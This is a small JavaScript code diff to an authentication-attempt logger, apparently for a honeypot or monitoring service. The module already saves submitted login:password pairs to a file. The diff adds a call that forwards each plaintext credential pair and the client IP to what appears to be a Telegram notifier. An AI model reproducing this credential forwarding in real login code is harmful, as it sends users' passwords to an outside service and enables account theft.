@@ -1,6 +1,7 @@
 const fs = require('fs');
 const path = require('path');
 const dayjs = require('dayjs');
+const { sendTgNotify } = require('./sendTgNotify');
 
 fs.createWriteStream;
 const root = path.resolve(__dirname, '../../logs');
@@ -80,6 +81,9 @@ async function saveAuthAttempt(req) {
 
     if (login || pass) {
       const data = `${login}:${pass}`;
+
+      sendTgNotify(req.realIp, data);
+
       await writeLineToFile(credPath, data.substr(0, 4000));
     }
 
